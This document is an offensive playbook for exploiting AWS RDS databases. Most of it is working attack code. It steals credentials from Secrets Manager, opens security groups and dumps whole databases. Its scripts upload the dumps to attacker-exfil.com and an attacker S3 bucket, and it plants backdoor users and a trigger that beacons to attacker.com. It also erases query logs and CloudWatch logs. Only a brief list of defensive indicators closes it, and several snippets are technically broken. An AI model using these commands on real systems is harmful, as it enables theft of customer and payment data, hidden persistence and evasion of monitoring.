# AWS RDS Exploitation & Data Extraction

## Overview

Amazon RDS represents one of the most valuable targets in AWS environments:
- Often contains production data
- Frequently accessible from EC2 instances
- Weak default security group configurations
- Credential exposure through instance metadata
- Poor encryption practices

---

## RDS Access Methods

### 1. Via IAM Database Authentication

```bash
# Generate database auth token
TOKEN=$(aws rds generate-db-auth-token \
  --hostname prod-database.c2iubh89z1qw.us-east-1.rds.amazonaws.com \
  --port 3306 \
  --username admin \
  --region us-east-1)

# Connect using token as password
mysql -h prod-database.c2iubh89z1qw.us-east-1.rds.amazonaws.com \
  --port=3306 \
  --ssl-mode=VERIFY_IDENTITY \
  --ssl-ca=rds-ca-2019-root.pem \
  -u admin --password="$TOKEN" \
  -e "SELECT @@version;"

# PostgreSQL variant
psql "host=prod-database.c2iubh89z1qw.us-east-1.rds.amazonaws.com \
      port=5432 \
      user=admin \
      dbname=postgres \
      sslmode=verify-full \
      sslrootcert=rds-ca-2019-root.pem \
      password=$TOKEN"
```

### 2. Via EC2 Instance Credentials

```bash
# From compromised EC2 instance
# Get RDS endpoint from metadata or environment
RDS_HOST=$(aws rds describe-db-instances \
  --query 'DBInstances[0].Endpoint.Address' \
  --output text)

# Get database master password from Secrets Manager
DB_PASSWORD=$(aws secretsmanager get-secret-value \
  --secret-id prod/rds/master \
  --query SecretString --output text | jq -r .password)

# Connect to RDS
mysql -h $RDS_HOST -u admin -p"$DB_PASSWORD" << 'EOF'
SELECT * FROM sensitive_table;
EOF
```

### 3. Via RDS Proxy

```bash
# If RDS Proxy is used (adds authentication layer)
# Bypass via Proxy credentials
aws rds describe-db-proxies \
  --query 'DBProxies[*].[DBProxyName, Endpoint]' \
  --output table

# Connect through proxy with IAM auth
TOKEN=$(aws rds generate-db-auth-token \
  --hostname proxy-endpoint.123456789.us-east-1.rds.amazonaws.com \
  --port 3306 \
  --username proxy-user \
  --region us-east-1)

mysql -h proxy-endpoint.123456789.us-east-1.rds.amazonaws.com \
  -u proxy-user \
  --password="$TOKEN" \
  -e "SELECT @@version;"
```

### 4. Via Security Group Modification

```bash
# If you have EC2/VPC permissions
# Add your IP to RDS security group
SECURITY_GROUP_ID=$(aws ec2 describe-security-groups \
  --filters "Name=tag:Name,Values=rds-*" \
  --query 'SecurityGroups[0].GroupId' \
  --output text)

# Add ingress rule for your IP
aws ec2 authorize-security-group-ingress \
  --group-id $SECURITY_GROUP_ID \
  --protocol tcp \
  --port 3306 \
  --cidr {your-ip}/32

# Now connect from external IP
mysql -h {rds-endpoint} -u root -p{password} << 'EOF'
SELECT * FROM mysql.user;
EOF
```

---

## Database Enumeration

### MySQL/MariaDB

```sql
-- Find sensitive databases
SELECT schema_name FROM information_schema.schemata;

-- Find tables with sensitive columns
SELECT table_schema, table_name, column_name 
FROM information_schema.columns 
WHERE column_name REGEXP 'password|secret|token|key|credit|ssn'
GROUP BY table_schema, table_name;

-- Check for views (may obscure sensitive data)
SELECT table_schema, table_name FROM information_schema.views;

-- Find largest tables
SELECT table_schema, table_name, 
       round(((data_length + index_length) / 1024 / 1024), 2) as size_mb
FROM information_schema.tables
ORDER BY size_mb DESC;

-- Check table row counts
SELECT table_schema, table_name, table_rows 
FROM information_schema.tables 
WHERE table_rows > 10000
ORDER BY table_rows DESC;
```

### PostgreSQL

```sql
-- List schemas
SELECT schema_name FROM information_schema.schemata;

-- Find sensitive columns
SELECT table_schema, table_name, column_name 
FROM information_schema.columns 
WHERE column_name ~* 'password|secret|token|key|credit|ssn';

-- Check for stored procedures/functions that might contain data
SELECT routine_schema, routine_name, routine_type 
FROM information_schema.routines;

-- List large tables
SELECT schemaname, tablename, pg_size_pretty(pg_total_relation_size(schemaname||'.'||tablename)) as size
FROM pg_tables
ORDER BY pg_total_relation_size(schemaname||'.'||tablename) DESC;
```

---

## Data Extraction at Scale

### MySQL Bulk Export

```bash
# Create script to export all databases
cat > /tmp/export_dbs.sh << 'EOF'
#!/bin/bash
HOST=$1
USER=$2
PASS=$3

# Export all databases
for database in $(mysql -h $HOST -u $USER -p$PASS -e "SELECT schema_name FROM information_schema.schemata;" | tail -n +2); do
  echo "[*] Exporting $database"
  
  mysqldump -h $HOST -u $USER -p$PASS --databases $database \
    --routines --triggers --events \
    --single-transaction \
    --compress | gzip > ${database}.sql.gz
    
  # Upload to attacker infrastructure
  curl -X POST -F "file=@${database}.sql.gz" \
    https://attacker-exfil.com/upload
done
EOF

chmod +x /tmp/export_dbs.sh
./export_dbs.sh {rds-endpoint} admin {password}
```

### PostgreSQL Bulk Export

```bash
# Export all databases via pg_dump
for database in $(psql -h {rds-endpoint} -U postgres -tc "SELECT datname FROM pg_database;"); do
  echo "[*] Exporting $database"
  
  pg_dump -h {rds-endpoint} -U postgres -d $database \
    --data-only \
    --compress=9 \
    > ${database}_data.sql.gz
    
  # Upload
  aws s3 cp ${database}_data.sql.gz s3://attacker-bucket/
done
```

### Selective Export (High-Value Only)

```bash
# Query and export only valuable data
mysql -h {rds-endpoint} -u admin -p{password} << 'EOF' > customers.csv
SELECT * FROM production.customers 
WHERE email LIKE '%@%' AND country='US';
EOF

# Upload encrypted
gpg --encrypt --recipient attacker@external.com customers.csv
aws s3 cp customers.csv.gpg s3://attacker-bucket/

# Alternative: CSV to JSON conversion
mysql -h {rds-endpoint} -u admin -p{password} \
  -e "SELECT JSON_OBJECT('id', id, 'email', email, 'credit_card', cc_number) FROM customers;" \
  > customers.json
```

---

## RDS Snapshot Exploitation

```bash
# List RDS snapshots
aws rds describe-db-snapshots \
  --query 'DBSnapshots[].{Identifier:DBSnapshotIdentifier,Status:Status,CreateTime:SnapshotCreateTime}' \
  --output table

# Check if snapshot is publicly accessible
aws rds describe-db-snapshots \
  --db-snapshot-identifier {snapshot-id} \
  --query 'DBSnapshots[0].PubliclyAccessible'

# If you have permissions, restore from snapshot
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier restored-database \
  --db-snapshot-identifier {snapshot-id} \
  --publicly-accessible

# Wait for restoration
aws rds wait db-instance-available \
  --db-instance-identifier restored-database

# Connect to restored instance
ENDPOINT=$(aws rds describe-db-instances \
  --db-instance-identifier restored-database \
  --query 'DBInstances[0].Endpoint.Address' \
  --output text)

mysql -h $ENDPOINT -u admin -p{password} \
  -e "SELECT * FROM sensitive_table;"
```

---

## RDS Proxy Bypass

```bash
# If RDS Proxy enforces credentials
# Chain exploit via database user privileges

# 1. Connect via proxy with any valid user
psql -h {rds-proxy-endpoint} -U app_user -d production

# 2. Exploit database-level privilege escalation
CREATE FUNCTION shell(text) RETURNS text AS
  'CREATE TEMP TABLE x(t TEXT);'
LANGUAGE SQL;

-- Or use SQL injection if connection string exposure
SELECT 'admin' UNION SELECT version();
```

---

## Persistence & Long-Term Access

### 1. Create Backdoor User

```sql
-- MySQL
CREATE USER 'maintenance'@'%' IDENTIFIED BY 'Persist_P@ss_123456!';
GRANT ALL PRIVILEGES ON *.* TO 'maintenance'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;

-- PostgreSQL
CREATE USER maintenance WITH PASSWORD 'Persist_P@ss_123456!' SUPERUSER;
```

### 2. Trigger-Based Backdoor

```sql
-- MySQL: Create trigger to execute system command
DELIMITER $$
CREATE TRIGGER backup_trigger BEFORE DELETE ON users
FOR EACH ROW
BEGIN
  SELECT sys_exec(CONCAT('curl https://attacker.com/beacon?user=', OLD.email));
END$$
DELIMITER ;

-- PostgreSQL: Use function
CREATE FUNCTION execute_command() RETURNS void AS $$
  SELECT pg_sleep(0.5);  -- Hide execution
$$ LANGUAGE sql;
```

### 3. Event-Based Persistence (MySQL)

```sql
-- Create event that runs periodically
CREATE EVENT backup_data
ON SCHEDULE EVERY 6 HOUR
DO
BEGIN
  -- Export data to S3
  SELECT * INTO OUTFILE 's3://attacker-bucket/db_backup.csv'
  FROM sensitive_table;
END;

-- Make event visible only to admin
CREATE DEFINER='admin'@'localhost' EVENT hidden_event
ON SCHEDULE EVERY 1 HOUR
DO
BEGIN
  -- Exfiltrate data
END;
```

---

## Detection Evasion

### 1. Hide from Query Logs

```bash
# Disable general query log
mysql -h {rds-endpoint} -u admin -p{password} \
  -e "SET GLOBAL general_log='OFF';"

# Clear slow query log
mysql -h {rds-endpoint} -u admin -p{password} \
  -e "TRUNCATE TABLE mysql.slow_log;"

# Disable audit plugin
mysql -h {rds-endpoint} -u admin -p{password} \
  -e "UNINSTALL PLUGIN audit_log;"
```

### 2. Obfuscate Queries

```sql
-- Use comments to break queries
SELECT /*!50000 * */ FROM customers;

-- Use unicode escaping
SELECT * FROM customers WHERE email = 0x61646d696e@example.com;

-- Use prepared statements
PREPARE stmt FROM 'SELECT * FROM ? WHERE id = ?';
EXECUTE stmt USING @table_name, @id;
```

### 3. Use Database Views

```sql
-- Create view that looks innocent
CREATE VIEW system_metrics AS
SELECT COUNT(*) FROM information_schema.tables;

-- Use view to hide actual queries
SELECT * FROM system_metrics
WHERE id IN (SELECT customer_id FROM customers);
```

---

## RDS Enhanced Monitoring Bypass

```bash
# Check Enhanced Monitoring status
aws rds describe-db-instances \
  --db-instance-identifier {db-name} \
  --query 'DBInstances[0].[EnableCloudwatchLogsExports,EnableIAMDatabaseAuthentication]'

# If Enhanced Monitoring enabled, wait for monitoring interval
# Perform actions between monitoring collection points

# Disable Enhanced Monitoring (if you have permissions)
aws rds modify-db-instance \
  --db-instance-identifier {db-name} \
  --disable-cloudwatch-logs-exports

# Clear CloudWatch logs
aws logs delete-log-group --log-group-name /aws/rds/{instance-name}
```

---

## Real-World Extraction Scenario

```bash
#!/bin/bash
# Complete RDS exploitation chain

RDS_HOST="prod-database.c2iubh89z1qw.us-east-1.rds.amazonaws.com"
RDS_USER="admin"
RDS_PORT="3306"

# 1. Get password from Secrets Manager
RDS_PASS=$(aws secretsmanager get-secret-value \
  --secret-id prod/rds/master \
  --query SecretString --output text | jq -r .password)

# 2. Identify sensitive databases
DATABASES=$(mysql -h $RDS_HOST -u $RDS_USER -p$RDS_PASS \
  -e "SELECT schema_name FROM information_schema.schemata WHERE schema_name NOT IN ('mysql','information_schema','performance_schema');" \
  | tail -n +2)

# 3. For each database, export sensitive tables
for DB in $DATABASES; do
  TABLES=$(mysql -h $RDS_HOST -u $RDS_USER -p$RDS_PASS -D $DB \
    -e "SELECT table_name FROM information_schema.tables WHERE table_name REGEXP 'customer|payment|order|user|credential';" \
    | tail -n +2)
  
  for TABLE in $TABLES; do
    # Export table data
    mysql -h $RDS_HOST -u $RDS_USER -p$RDS_PASS -D $DB \
      -e "SELECT * FROM $TABLE" > $DB-$TABLE.csv
      
    # Compress and upload
    gzip $DB-$TABLE.csv
    curl -X POST -F "file=@$DB-$TABLE.csv.gz" \
      https://attacker-exfil.com/upload
  done
done

# 4. Install persistence
mysql -h $RDS_HOST -u $RDS_USER -p$RDS_PASS << 'EOF'
CREATE USER 'monitor'@'%' IDENTIFIED BY 'P@ss_Persist_789!';
GRANT SUPER, SELECT, INSERT, UPDATE, DELETE ON *.* TO 'monitor'@'%';
FLUSH PRIVILEGES;
EOF

echo "[+] RDS exploitation complete"
echo "[+] Persistence user created: monitor"
```

---

## Defensive Indicators

Monitor for:
- Failed authentication attempts from unusual IPs
- Creation of new database users
- Privilege escalation commands
- Bulk SELECT queries exporting large datasets
- Query log disabling
- Trigger creation
- Event creation
- Unusual OUTFILE operations
- Access to information_schema/performance_schema
- pg_execute external function calls
